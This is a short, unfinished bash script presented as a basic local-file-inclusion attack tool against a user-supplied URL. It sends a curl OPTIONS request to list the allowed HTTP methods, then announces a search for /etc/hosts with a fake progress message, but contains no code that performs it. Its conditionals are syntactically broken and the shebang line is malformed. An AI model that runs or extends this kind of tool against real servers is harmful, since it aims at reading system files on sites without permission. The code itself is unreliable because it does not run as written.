!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD=' \033[1m'

echo "T O O   B A S I C   L F I   T O O L"
echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK)"


url="$1"

echo "Requesting the server which methods are allowed..."

methods=$(curl -I -X OPTIONS $url | grep -i "Allow:")
if [ -n "$methods" ]; then 
if [ echo "$methods" | grep -i "POST" ]; then 
echo "Request POST allowed"
fi
if [ echo "$methods" | grep -i "GET" ]; then 
echo "Request GET allowed"
fi
if [ echo "$methods" | grep -i "HEAD" ]; then 
echo "Request HEAD allowed"
fi
 
else 
echo -e "${RED}${BOLD}Server sets in no sniffing mode : *womp womp sound*${RESET}"
fi

echo "Searching for /etc/hosts file..."
echo "25% finished"

